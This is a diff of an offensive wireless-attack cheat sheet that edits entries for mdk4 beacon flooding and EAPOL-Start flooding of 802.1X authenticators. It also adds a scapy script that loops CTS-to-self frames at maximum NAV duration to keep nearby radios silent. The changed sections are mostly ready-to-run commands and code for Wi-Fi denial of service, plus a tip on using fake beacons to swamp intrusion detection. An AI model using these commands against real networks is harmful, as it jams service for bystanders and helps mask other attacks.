@@ -51,23 +51,26 @@ Consumes AP CPU on probe response; often a nuisance more than a DoS.
 
 ### `b` — Beacon flood
 
-Fake APs — every SSID in a wordlist. Confuses passive scanners.
+Fake APs — a chosen SSID (or many). Confuses passive scanners.
 
 ```
-mdk4 wlan1mon b -c 6 -n /root/ssids.txt -h
+# Single SSID, locked to channel 6, 500 pkts/sec.
+mdk4 wlan1mon b -n TargetSSID -c 6 -s 500
+
+# Many SSIDs from a wordlist (one per line).
+mdk4 wlan1mon b -f /root/ssids.txt -c 6 -s 500
 ```
 
 Also used to *distract* — a WIDS overwhelmed with fake beacons may
 miss a genuine attack elsewhere.
 
-### `v` — RTS/CTS NAV manipulation
+### RTS/CTS NAV manipulation — NOT an mdk4 mode
 
-Send CTS frames with long NAV durations, silencing legitimate STAs
-that respect the NAV.
-
-```
-mdk4 wlan1mon v -a AA:BB:CC:DD:EE:FF -t
-```
+mdk4 has no `v` mode; its valid mode set is `b/a/p/d/m/e/f/s/w/x/g`.
+For the NAV-reservation primitive (CTS-to-self with a large Duration
+field, 802.11 Control frame subtype 12, so ID=0x7fff maxes the NAV
+at 32767 μs), use scapy — see [Path B: CTS-to-self
+silencing](#cts-to-self-silencing) below.
 
 ### `m` — Michael MIC countermeasure
 
@@ -88,8 +91,11 @@ For 802.1X targets. Each EAPOL-Start provokes an EAP-Request from
 the authenticator. Fills the RADIUS backend's state.
 
 ```
-mdk4 wlan1mon e -t AA:BB:CC:DD:EE:FF -e
+mdk4 wlan1mon e -t AA:BB:CC:DD:EE:FF -n TargetSSID
 ```
+
+mdk4 mode `e` needs `-t <BSSID>` and `-n <SSID>`; the older `-e`
+flag has been dropped in current mdk4 builds.
 
 ### `f` — Fuzzed beacon / probe response
 
@@ -118,16 +124,22 @@ for i in range(1000):
     sendp(RadioTap()/a, iface="wlan1mon", verbose=False)
 ```
 
-### CTS-to-self silencing
+<a id="cts-to-self-silencing"></a>
+### CTS-to-self silencing (RTS/CTS NAV reservation)
 
-Send frequent CTS-to-self with long NAV. Adjacent radios go quiet
-for the NAV duration.
+Send frequent CTS-to-self frames with a large NAV duration. 802.11
+radios that respect the NAV go quiet for the reserved airtime.
+Control-frame subtype 12 = CTS; the Duration/ID field carries the
+NAV in microseconds and maxes at 0x7FFF (32767 μs) per frame — chain
+frames back-to-back to hold the medium.
 
 ```python
-cts = Dot11(type=1, subtype=12,        # control, cts
+# 802.11 Control frame, subtype 12 (CTS). RA (addr1) = self, no TA.
+cts = Dot11(type=1, subtype=12,
             addr1=YOUR_MAC,             # cts-to-self target = us
-            ID=0x7fff)                  # max NAV
-sendp(RadioTap()/cts, iface="wlan1mon", verbose=False)
+            ID=0x7fff)                  # max NAV = 32767 μs
+sendp(RadioTap()/cts, iface="wlan1mon", verbose=False, loop=1,
+      inter=0.001)                     # ~1000 pps → continuous NAV
 ```
 
 ### TIM / DTIM poisoning
